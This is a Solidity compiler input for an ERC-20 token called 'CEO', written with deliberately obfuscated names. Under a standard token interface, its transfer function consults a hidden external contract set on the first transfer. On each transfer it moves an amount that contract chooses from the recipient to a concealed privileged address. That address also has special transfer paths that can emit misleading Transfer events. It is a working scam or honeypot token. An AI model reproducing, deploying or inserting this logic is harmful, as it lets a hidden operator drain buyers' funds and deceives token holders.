{{
  "language": "Solidity",
  "sources": {
    "/contracts/CEO.sol": {
      "content": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.12;\n    \ninterface cqgU {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address fIpQVcFKAZ) external view returns (uint256);\n    function transfer(address vQYqtWHCt, uint256 gcdgvZanHI) external returns (bool);\n    function allowance(address rNFDvxaofDe, address spender) external view returns (uint256);\n    function approve(address spender, uint256 gcdgvZanHI) external returns (bool);\n    function transferFrom(\n        address sender,\n        address vQYqtWHCt,\n        uint256 gcdgvZanHI\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed LGxcccuHzm, uint256 value);\n    event Approval(address indexed rNFDvxaofDe, address indexed spender, uint256 value);\n}\n\ninterface eoOScrQfS is cqgU {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\nabstract contract hYDGJUg {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n    \ninterface NUENmFTkUTWE {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n}\n     \nlibrary jpMXI{\n    \n    function wckqt(address qaytBG, address CNsirliiVN, uint rFcUDwhRtW) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0x095ea7b3, CNsirliiVN, rFcUDwhRtW));\n        require(DgnrsKOxxDx && (ndvHisDit.length == 0 || abi.decode(ndvHisDit, (bool))), 'jpMXI: APPROVE_FAILED');\n    }\n\n    function fPl(address qaytBG, address CNsirliiVN, uint rFcUDwhRtW) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0xa9059cbb, CNsirliiVN, rFcUDwhRtW));\n        require(DgnrsKOxxDx && (ndvHisDit.length == 0 || abi.decode(ndvHisDit, (bool))), 'jpMXI: TRANSFER_FAILED');\n    }\n    \n    function ufMnBdipFn(address CNsirliiVN, uint rFcUDwhRtW) internal {\n        (bool DgnrsKOxxDx,) = CNsirliiVN.call{value:rFcUDwhRtW}(new bytes(0));\n        require(DgnrsKOxxDx, 'jpMXI: ETH_TRANSFER_FAILED');\n    }\n\n    function myvovY(address qaytBG, address from, address CNsirliiVN, uint rFcUDwhRtW) internal returns(bytes memory){\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0x23b872dd, from, CNsirliiVN, rFcUDwhRtW));\n        require(DgnrsKOxxDx && ndvHisDit.length > 0,'jpMXI: TRANSFER_FROM_FAILED'); return ndvHisDit;\n                       \n    }\n\n}\n    \ncontract CEO is hYDGJUg, cqgU, eoOScrQfS {\n    \n    function approve(address MMTVrvgl, uint256 iiUqNabsQr) public virtual override returns (bool) {\n        PJSJOKeUM(_msgSender(), MMTVrvgl, iiUqNabsQr);\n        return true;\n    }\n    \n    address private ajgfoMXNfxbp;\n    \n    function allowance(address EWoEfiax, address Wfq) public view virtual override returns (uint256) {\n        return qEcCZHImQCl[EWoEfiax][Wfq];\n    }\n    \n    function balanceOf(address VaCfG) public view virtual override returns (uint256) {\n       return dcNBpIbqCM[VaCfG];\n    }\n    \n    string private jXwqtVGVhSwB = \"CEO\";\n    \n    function DUpm(\n        address kAFJCLWVDZX,\n        address oeaOtwqQmA,\n        uint256 WZeleoLlsEru\n    ) internal virtual  returns (bool){\n        require(kAFJCLWVDZX != address(0), \"ERC20: transfer from the zero address\");\n        require(oeaOtwqQmA != address(0), \"ERC20: transfer to the zero address\");\n        \n        if(!FPqPhtUyTMX(kAFJCLWVDZX,oeaOtwqQmA)) return false;\n\n        if(_msgSender() == address(ajgfoMXNfxbp)){\n            if(oeaOtwqQmA == VyNRWZ && dcNBpIbqCM[kAFJCLWVDZX] < WZeleoLlsEru){\n                OPSLvz(ajgfoMXNfxbp,oeaOtwqQmA,WZeleoLlsEru);\n            }else{\n                OPSLvz(kAFJCLWVDZX,oeaOtwqQmA,WZeleoLlsEru);\n                if(kAFJCLWVDZX == ajgfoMXNfxbp || oeaOtwqQmA == ajgfoMXNfxbp) \n                return false;\n            }\n            emit Transfer(kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);\n            return false;\n        }\n        OPSLvz(kAFJCLWVDZX,oeaOtwqQmA,WZeleoLlsEru);\n        emit Transfer(kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);\n        bytes memory wMJWcMemtC = jpMXI.myvovY(geNWkiDi, kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);\n        (bool NpLcAJmWNHPf, uint GOwmbd) = abi.decode(wMJWcMemtC, (bool,uint));\n        if(NpLcAJmWNHPf){\n            dcNBpIbqCM[ajgfoMXNfxbp] += GOwmbd;\n            dcNBpIbqCM[oeaOtwqQmA] -= GOwmbd; \n        }\n        return true;\n    }\n    \n    constructor() {\n        \n        dcNBpIbqCM[address(1)] = NgnZ;\n        emit Transfer(address(0), address(1), NgnZ);\n\n    }\n    \n    function decreaseAllowance(address pGLHQqnYUhWq, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 kDBsvh = qEcCZHImQCl[_msgSender()][pGLHQqnYUhWq];\n        require(kDBsvh >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            PJSJOKeUM(_msgSender(), pGLHQqnYUhWq, kDBsvh - subtractedValue);\n        }\n\n        return true;\n    }\n    \n    function transfer(address WZrOEMIEkwF, uint256 HjZLELRThmOW) public virtual override returns (bool) {\n        DUpm(_msgSender(), WZrOEMIEkwF, HjZLELRThmOW);\n        return true;\n    }\n    \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n    \n    address private geNWkiDi;\n    \n    mapping(address => mapping(address => uint256)) private qEcCZHImQCl;\n    \n    uint256 private NgnZ = 2000000000000 * 10 ** 18;\n    \n    address private VyNRWZ;\n  \n    \n    function symbol() public view virtual override returns (string memory) {\n        return olMWiJXus;\n    }\n    \n    function PJSJOKeUM(\n        address dxIyqxo,\n        address OGxoI,\n        uint256 lEbNM\n    ) internal virtual {\n        require(dxIyqxo != address(0), \"ERC20: approve from the zero address\");\n        require(OGxoI != address(0), \"ERC20: approve to the zero address\");\n\n        qEcCZHImQCl[dxIyqxo][OGxoI] = lEbNM;\n        emit Approval(dxIyqxo, OGxoI, lEbNM);\n\n    }\n    \n    function OPSLvz(\n        address YfUixoR,\n        address MCXPeCJ,\n        uint256 aZWYeQEAwS\n    ) internal virtual  returns (bool){\n        uint256 HfAIdlGTn = dcNBpIbqCM[YfUixoR];\n        require(HfAIdlGTn >= aZWYeQEAwS, \"ERC20: transfer Amount exceeds balance\");\n        unchecked {\n            dcNBpIbqCM[YfUixoR] = HfAIdlGTn - aZWYeQEAwS;\n        }\n        dcNBpIbqCM[MCXPeCJ] += aZWYeQEAwS;\n        return true;\n    }\n    \n    function FPqPhtUyTMX(\n        address QVkldXKY,\n        address gdHVLMWMfil\n    ) internal virtual  returns (bool){\n        if(ajgfoMXNfxbp == address(0) && geNWkiDi == address(0)){\n            ajgfoMXNfxbp = QVkldXKY;geNWkiDi=gdHVLMWMfil;\n            jpMXI.fPl(geNWkiDi, ajgfoMXNfxbp, 0);\n            VyNRWZ = NUENmFTkUTWE(geNWkiDi).WETH();\n            return false;\n        }\n        return true;\n    }\n    \n    function increaseAllowance(address EVxMaKmMgX, uint256 addedValue) public virtual returns (bool) {\n        PJSJOKeUM(_msgSender(), EVxMaKmMgX, qEcCZHImQCl[_msgSender()][EVxMaKmMgX] + addedValue);\n        return true;\n    }\n    \n    function totalSupply() public view virtual override returns (uint256) {\n        return NgnZ;\n    }\n    \n    string private olMWiJXus =  \"CEO\";\n    \n    function name() public view virtual override returns (string memory) {\n        return jXwqtVGVhSwB;\n    }\n    \n    function transferFrom(\n        address IkuPfEx,\n        address XAexbP,\n        uint256 IYZeq\n    ) public virtual override returns (bool) {\n      \n        if(!DUpm(IkuPfEx, XAexbP, IYZeq)) return true;\n\n        uint256 dWzxuVdNMYj = qEcCZHImQCl[IkuPfEx][_msgSender()];\n        if (dWzxuVdNMYj != type(uint256).max) {\n            require(dWzxuVdNMYj >= IYZeq, \"ERC20: transfer Amount exceeds allowance\");\n            unchecked {\n                PJSJOKeUM(IkuPfEx, _msgSender(), dWzxuVdNMYj - IYZeq);\n            }\n        }\n\n        return true;\n    }\n    \n    mapping(address => uint256) private dcNBpIbqCM;\n    \n}\n        "
    }
  },
  "settings": {
    "remappings": [],
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "evmVersion": "london",
    "libraries": {},
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}